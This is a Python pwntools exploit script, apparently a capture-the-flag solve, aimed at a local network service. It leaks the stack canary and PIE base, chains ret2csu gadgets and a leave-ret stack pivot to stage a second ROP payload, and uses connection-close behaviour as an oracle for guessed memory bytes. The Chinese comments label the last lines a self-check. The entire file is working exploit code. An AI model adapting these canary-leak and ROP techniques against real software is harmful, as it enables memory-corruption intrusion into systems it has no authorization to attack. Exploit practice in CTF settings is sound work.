import sys, time, select, struct
from pwn import *
context.arch="amd64"; context.log_level="error"
HOST,PORT="127.0.0.1",34875
POP_RDI=0x200603; CSU_POP=0x2005fa; CSU_CALL=0x2005e0; GET_INPUT=0x20031c
LEAVE_RET=0x20059d; GETNUM=0x2003aa; CMP=0x20038b; GOT_READ=0x600fa8
CSU_INIT=0x2005a0; STAGE2=0x601200; FRAME=0x601500; CONS=0x601a00; SCR=0x601e00
SIZE_LEAK=0x59
def csu_read(pie, fd, dst, n):
    return (p64(pie+CSU_POP)+p64(0)+p64(1)+p64(pie+GOT_READ)+p64(fd)+p64(dst)+p64(n)
            +p64(pie+CSU_CALL)+p64(0)+p64(0)*6)
def run(fd, guess, fix=None, big=40000, idx=0):
    p=remote(HOST,PORT)
    try:
        p.recvuntil(b"name size", timeout=5); p.send(b"136\n"); p.recvuntil(b"> ", timeout=5)
        p.send(b"A"*(SIZE_LEAK-1)+b"X"+b"\n")
        d=p.recvuntil(b"Now you have 1 choice to change your name.", timeout=5)
        body=d.split(b"Your name is: ",1)[1].rsplit(b"\nNow you have 1 choice",1)[0]
        if len(body)<SIZE_LEAK+13: return None
        canary=b"\x00"+body[SIZE_LEAK:SIZE_LEAK+7]
        pie=u64(body[SIZE_LEAK+7:SIZE_LEAK+13].ljust(8,b"\x00"))-CSU_INIT
        frame=pie+FRAME; cons=pie+CONS; scr=pie+SCR; stage2=pie+STAGE2
        chain =p64(0)+csu_read(pie,fd,scr,0)+csu_read(pie,fd,frame-0x1c,1)
        chain+=p64(pie+0x2005fb)+p64(frame)+p64(0)*4
        chain+=p64(pie+GETNUM)+p64(pie+CMP)
        blob=bytearray(b"\x00"*0x800); blob[0:len(chain)]=chain
        fb=FRAME-STAGE2-0x20
        blob[fb+0x04:fb+0x08]=p32(0 if fix is None else fix)
        blob[fb+0x08:fb+0x10]=p64(frame-8)
        blob[fb+0x14:fb+0x18]=p32(0)
        blob[fb+0x18:fb+0x20]=canary
        blob[fb+0x20:fb+0x28]=p64(0)
        blob[fb+0x28:fb+0x30]=p64(cons)
        if fix is not None:
            blob[0x128:0x130]=p64(0)          # 第3个 read 的 count=0 -> 不覆盖 fix
        c=p64(0)
        for _ in range(10): c+=csu_read(pie,0,scr+0x100,0x1000)
        c+=p64(pie+GETNUM)
        blob[CONS-STAGE2:CONS-STAGE2+len(c)]=c
        blob=bytes(blob)
        if b"\n" in blob: return None
        p1=b"B"*0x58+canary+p64(stage2)+p64(pie+POP_RDI)+p64(stage2)+p64(pie+GET_INPUT)+p64(pie+LEAVE_RET)
        p.send(p1); time.sleep(1.05)
        p.send(blob+b"\n"); time.sleep(0.12)
        p.send(("%d\n"%guess).encode()+b"Q"*11)
        time.sleep(0.25)
        try: p.send(b"Z"*big)
        except Exception: return True
        t0=time.time()
        while time.time()-t0<2.2:
            r,_,_=select.select([p.sock],[],[],0.1)
            if r:
                try: dd=p.sock.recv(4096)
                except Exception: return True
                if not dd: return True
        return False
    except Exception:
        return None
    finally:
        p.close()
def go(tag, fd, g, fix=None, tries=4):
    r=None
    for _ in range(tries):
        r=run(fd,g,fix)
        if r is not None: break
    print("%s -> closed=%s" % (tag, r), flush=True)
    return r
if __name__=="__main__":
    print("=== 自检: mem 固定 0x41 ===")
    go("fix=0x41 guess=0x30 (期望 True)", 3, 0x30, 0x41)
    go("fix=0x41 guess=0x50 (期望 False)", 3, 0x50, 0x41)
